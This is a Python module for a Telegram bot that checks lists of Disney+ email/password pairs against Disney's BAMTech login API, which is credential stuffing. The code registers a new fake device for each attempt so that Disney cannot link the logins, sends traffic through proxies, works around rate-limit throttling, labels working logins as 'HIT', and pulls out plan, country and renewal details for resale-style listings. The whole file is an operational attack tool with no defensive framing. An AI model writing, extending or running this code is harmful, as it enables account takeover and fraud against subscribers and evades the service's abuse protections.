#!/usr/bin/env python3
"""disney_checker.py — Disney+ account checker for Telegram bot.

Drop-in module: import check_account and call it directly.
No CLI, no rich, no stdin. Full BAMTech flow preserved from CLI version
including throttle retries, bad-creds detection, and all fallback paths.
"""

import os
import json
import time
import urllib.parse
import urllib.request
import urllib.error

# ── Constants ─────────────────────────────────────────────────────────────────

_CLIENT_ID      = "disney-svod-3d9324fc"
_DEVICE_GQL     = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
_PUBLIC_GQL     = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
_TOKEN_URL      = "https://disney.api.edge.bamgrid.com/token"
_IDP_LOGIN      = "https://disney.api.edge.bamgrid.com/idp/login"
_ACCOUNTS_GRANT = "https://disney.api.edge.bamgrid.com/accounts/grant"
_ACCOUNTS_ME    = "https://disney.api.edge.bamgrid.com/accounts/me"
_SUBSCRIBERS    = "https://disney.api.edge.bamgrid.com/v2/subscribers"
_SUBSCRIPTIONS  = "https://disney.api.edge.bamgrid.com/subscriptions"

_BAMSDK_VERSION = "35.2"
_THROTTLE_DELAY = 5   # seconds to wait after a throttle before retrying
_MAX_RETRIES    = 3

_BASE_HDRS = {
    "Accept":               "application/json; charset=utf-8",
    "Content-Type":         "application/json; charset=utf-8",
    "X-BAMSDK-Platform-Id": "browser",
    "X-BAMSDK-Client-Id":   _CLIENT_ID,
    "X-BAMSDK-Version":     _BAMSDK_VERSION,
    "X-DSS-Edge-Accept":    "vnd.dss.edge+json; version=2",
    "User-Agent": (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    ),
    "Origin":          "https://www.disneyplus.com",
    "Referer":         "https://www.disneyplus.com/",
    "Accept-Language": "en-US,en;q=0.9",
}

_REGISTER_MUTATION = """mutation registerDevice($input: RegisterDeviceInput!) {
  registerDevice(registerDevice: $input) {
    grant { grantType assertion }
  }
}"""

_LOGIN_MUTATION = (
    "mutation login($input: LoginInput!) { login(login: $input) { actionGrant } }"
)

_LOGIN_WITH_AG_MUTATION = (
    "mutation loginWithActionGrant($input: LoginWithActionGrantInput!) {"
    " loginWithActionGrant(login: $input) {"
    "   token { accessToken refreshToken }"
    "   activeSession { sessionId }"
    " }"
    "}"
)

_REGISTER_INPUT = {
    "applicationRuntime": "chrome",
    "attributes": {
        "browserName":            "chrome",
        "browserVersion":         "124.0.0.0",
        "manufacturer":           "apple",
        "model":                  None,
        "operatingSystem":        "macintosh",
        "operatingSystemVersion": "10.15.7",
        "osDeviceIds":            [],
    },
    "deviceFamily":   "browser",
    "deviceLanguage": "en-US",
    "deviceProfile":  "macosx",
}

# ── API key ───────────────────────────────────────────────────────────────────

def _get_api_key() -> str:
    key = os.environ.get("DISNEY_API_KEY", "").strip()
    if not key:
        raise RuntimeError(
            "DISNEY_API_KEY environment variable is not set. "
            "Add it to your bot's environment before starting."
        )
    return key

# ── Proxy / opener ────────────────────────────────────────────────────────────

def _make_opener(proxy_url: str | None):
    if proxy_url:
        ph = urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url})
        return urllib.request.build_opener(ph)
    return urllib.request.build_opener()

# ── Low-level HTTP ────────────────────────────────────────────────────────────

def _gql(opener, url: str, query: str, variables: dict,
         op: str, auth: str, timeout: int = 20):
    payload = json.dumps(
        {"query": query, "variables": variables, "operationName": op}
    ).encode()
    req = urllib.request.Request(
        url, data=payload,
        headers={**_BASE_HDRS, "Authorization": f"Bearer {auth}"}
    )
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}


def _post_json(opener, url: str, body: dict, auth: str, timeout: int = 20):
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        url, data=data,
        headers={**_BASE_HDRS, "Authorization": f"Bearer {auth}"}
    )
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body_j = json.loads(e.read() or b"{}")
        except Exception:
            body_j = {}
        return e.code, body_j
    except Exception as exc:
        return 0, {"_exc": str(exc)}


def _token_form(opener, form: dict, api_key: str, timeout: int = 20):
    data = urllib.parse.urlencode(form).encode()
    req = urllib.request.Request(
        _TOKEN_URL, data=data,
        headers={
            **_BASE_HDRS,
            "Content-Type":  "application/x-www-form-urlencoded",
            "Authorization": f"Bearer {api_key}",
        }
    )
    try:
        with opener.open(req, timeout=timeout) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return {"_error": e.code, **body}
    except Exception as exc:
        return {"_exc": str(exc)}


def _get_json(opener, url: str, auth: str, timeout: int = 20):
    req = urllib.request.Request(
        url, headers={**_BASE_HDRS, "Authorization": f"Bearer {auth}"}
    )
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            body = json.loads(e.read() or b"{}")
        except Exception:
            body = {}
        return e.code, body
    except Exception as exc:
        return 0, {"_exc": str(exc)}

# ── Device token ──────────────────────────────────────────────────────────────

def _fresh_device_token(opener, api_key: str, timeout: int = 20) -> str:
    """Register a brand-new device and exchange for a device JWE token.
    Each account check gets its own device identity so Disney can't
    correlate multiple login attempts to the same device.
    """
    s, r = _gql(
        opener, _DEVICE_GQL, _REGISTER_MUTATION,
        {"input": _REGISTER_INPUT}, "registerDevice", api_key, timeout
    )
    if s != 200 or not (r.get("data") or {}).get("registerDevice"):
        raise RuntimeError(f"registerDevice failed {s}: {r}")
    assertion = r["data"]["registerDevice"]["grant"]["assertion"]

    tok = _token_form(opener, {
        "grant_type":        "urn:ietf:params:oauth:grant-type:token-exchange",
        "latitude":          "0",
        "longitude":         "0",
        "platform":          "browser",
        "subject_token":     assertion,
        "subject_token_type": "urn:bamtech:params:oauth:token-type:device",
    }, api_key, timeout)

    if "access_token" not in tok:
        raise RuntimeError(f"device token exchange failed: {tok}")
    return tok["access_token"]

# ── Error classifiers ─────────────────────────────────────────────────────────

def _err_code(e: dict) -> str:
    return (e.get("code") or e.get("extensions", {}).get("code") or "").lower()


def _is_throttled(errors: list) -> bool:
    return any("throttled" in _err_code(e) for e in errors)


def _is_bad_creds(errors: list, http_status: int) -> bool:
    bad_fragments = (
        "bad-credentials", "not-found", "user-disabled",
        "identity.bad-credentials", "invalid-credentials",
        "identity.not-found",
    )
    for e in errors:
        code = _err_code(e)
        if any(f in code for f in bad_fragments):
            return True
    return http_status == 401

# ── Data extraction ───────────────────────────────────────────────────────────

def _get_country(me: dict) -> str:
    attrs = me.get("attributes", {})

    # 1. Purchase location (most reliable)
    purchase = attrs.get("locations", {}).get("purchase", {})
    if purchase.get("country"):
        return purchase["country"].upper()

    # 2. Consent preference: dss_country_code / ot_country_code
    for elem in (attrs.get("consentPreferences") or {}).get("dataElements", []):
        if elem.get("name") in ("dss_country_code", "ot_country_code") and elem.get("value"):
            return elem["value"].upper()

    # 3. Registration geoip
    reg = attrs.get("locations", {}).get("registration", {})
    if reg.get("geoIp", {}).get("country"):
        return reg["geoIp"]["country"].upper()

    return "N/A"


def _get_active_sub(subscriptions: list) -> dict:
    """Return first ACTIVE/SUBSCRIBED subscription, else {}."""
    for s in subscriptions:
        if s.get("state") == "ACTIVE":
            return s
        status_type = (s.get("status") or {}).get("type", "")
        if status_type == "SUBSCRIBED" or s.get("isActive"):
            return s
    return {}


def _get_renewal_date(subscriptions_raw: list) -> str:
    active = [s for s in subscriptions_raw if s.get("isActive")]
    for s in (active or subscriptions_raw):
        nrd = s.get("nextRenewalDate")
        if nrd:
            return nrd[:10]
    return "N/A"


def _build_hit_line(me: dict, v2: dict, subscriptions_raw: list) -> tuple[bool, str]:
    """Return (has_active_plan, formatted_line)."""
    attrs          = me.get("attributes", {})
    email_verified = str(attrs.get("emailVerified", False)).lower()
    country        = _get_country(me)

    v2_subs = v2.get("subscriptions") or []
    active  = _get_active_sub(v2_subs)

    if active:
        plan_name      = active.get("product", {}).get("name") or "Disney Plus"
        is_trial       = active.get("term", {}).get("isFreeTrial", False)
        free_trial_str = "true" if is_trial else "false"
        has_plan       = True
    else:
        plan_name      = v2.get("subscriberStatus", "UNKNOWN").title()
        free_trial_str = "false"
        has_plan       = False

    renewal = _get_renewal_date(subscriptions_raw)

    line = (
        f"EmailVerified = {email_verified} | "
        f"Country = {country} | "
        f"Plan = [{plan_name}] | "
        f"Free Trial = {free_trial_str} | "
        f"Next Renewal Date = {renewal}"
    )
    return has_plan, line

# ── Main public API ───────────────────────────────────────────────────────────

def check_account(
    email: str,
    password: str,
    proxy_url: str | None = None,
    timeout: int = 20,
) -> dict:
    """Check a single Disney+ account.

    Returns a dict with keys:
        status   : "HIT" | "BAD" | "ERROR"
        email    : str
        password : str
        plan     : str   (only on HIT — the formatted info line)
        has_plan : bool  (only on HIT — True if an active subscription exists)
        reason   : str   (only on ERROR)
    """
    opener = _make_opener(proxy_url)
    base   = {"email": email, "password": password}

    try:
        api_key = _get_api_key()
    except RuntimeError as exc:
        return {**base, "status": "ERROR", "reason": str(exc)}

    # ── Step 1-2: fresh device token ──────────────────────────────────────────
    try:
        dev_tok = _fresh_device_token(opener, api_key, timeout)
    except Exception as exc:
        return {**base, "status": "ERROR", "reason": f"device-token: {exc}"}

    # ── Step 3: GQL login → actionGrant, with throttle retry + /idp fallback ─
    id_tok = None
    for attempt in range(1, _MAX_RETRIES + 1):
        s, r = _gql(
            opener, _PUBLIC_GQL, _LOGIN_MUTATION,
            {"input": {"email": email, "password": password}},
            "login", dev_tok, timeout
        )
        errors = r.get("errors", [])

        if s == 200 and not errors:
            action_grant = (r.get("data") or {}).get("login", {}).get("actionGrant")
            if action_grant:
                id_tok = action_grant
                break

        if _is_throttled(errors):
            # GQL throttled → try /idp/login as same-attempt fallback
            s2, r2 = _post_json(
                opener, _IDP_LOGIN,
                {"email": email, "password": password},
                dev_tok, timeout
            )
            errors2 = r2.get("errors", [])

            if s2 == 200 and "id_token" in r2:
                id_tok = r2["id_token"]
                break

            if _is_throttled(errors2):
                if attempt < _MAX_RETRIES:
                    time.sleep(_THROTTLE_DELAY * attempt)
                    try:
                        dev_tok = _fresh_device_token(opener, api_key, timeout)
                    except Exception:
                        pass
                    continue
                return {**base, "status": "ERROR",
                        "reason": f"throttled after {attempt} attempts"}

            if _is_bad_creds(errors2, s2):
                return {**base, "status": "BAD"}

            desc = (errors2[0].get("description", "") or _err_code(errors2[0])
                    if errors2 else "")
            return {**base, "status": "ERROR",
                    "reason": desc or f"idp/login HTTP {s2}"}

        if _is_bad_creds(errors, s):
            return {**base, "status": "BAD"}

        desc = _err_code(errors[0]) if errors else ""
        return {**base, "status": "ERROR",
                "reason": desc or f"gql-login HTTP {s}"}

    if not id_tok:
        return {**base, "status": "ERROR", "reason": "login: no id_token"}

    # ── Step 4: loginWithActionGrant → account JWT ────────────────────────────
    acc_tok = None
    s, r = _gql(
        opener, _PUBLIC_GQL, _LOGIN_WITH_AG_MUTATION,
        {"input": {"actionGrant": id_tok}},
        "loginWithActionGrant", dev_tok, timeout
    )
    ag_data     = (r.get("data") or {}).get("loginWithActionGrant", {})
    gql_acc_tok = (ag_data.get("token") or {}).get("accessToken")

    if s == 200 and gql_acc_tok:
        acc_tok = gql_acc_tok
    else:
        # Fallback: REST /accounts/grant + /token
        s2, r2 = _post_json(opener, _ACCOUNTS_GRANT, {"id_token": id_tok},
                            dev_tok, timeout)
        if s2 != 200 or "assertion" not in r2:
            errs2 = r2.get("errors", [])
            desc2 = errs2[0].get("description", "") if errs2 else ""
            return {**base, "status": "ERROR",
                    "reason": desc2 or f"accounts/grant HTTP {s2}"}

        tok2 = _token_form(opener, {
            "grant_type":        "urn:ietf:params:oauth:grant-type:token-exchange",
            "subject_token":     r2["assertion"],
            "subject_token_type": "urn:bamtech:params:oauth:token-type:account",
            "latitude":          "0",
            "longitude":         "0",
            "platform":          "browser",
        }, api_key, timeout)

        acc_tok = tok2.get("access_token")
        if not acc_tok:
            return {**base, "status": "ERROR",
                    "reason": f"account token: {tok2.get('error_description', str(tok2))[:80]}"}

    # ── Step 5: GET /accounts/me ──────────────────────────────────────────────
    s_me, me = _get_json(opener, _ACCOUNTS_ME, acc_tok, timeout)
    if s_me != 200:
        me = {}

    # ── Step 6: GET /v2/subscribers ───────────────────────────────────────────
    s_v2, v2 = _get_json(opener, _SUBSCRIBERS, acc_tok, timeout)
    if s_v2 != 200:
        v2 = {"subscriberStatus": "UNKNOWN", "subscriptions": []}

    # ── Step 7: GET /subscriptions (for nextRenewalDate) ──────────────────────
    subscriptions_raw = []
    s_rs, rs = _get_json(opener, _SUBSCRIPTIONS, acc_tok, timeout)
    if s_rs == 200 and isinstance(rs, list):
        subscriptions_raw = rs

    has_plan, hit_line = _build_hit_line(me, v2, subscriptions_raw)
    return {**base, "status": "HIT", "plan": hit_line,
            "has_plan": has_plan, "reason": ""}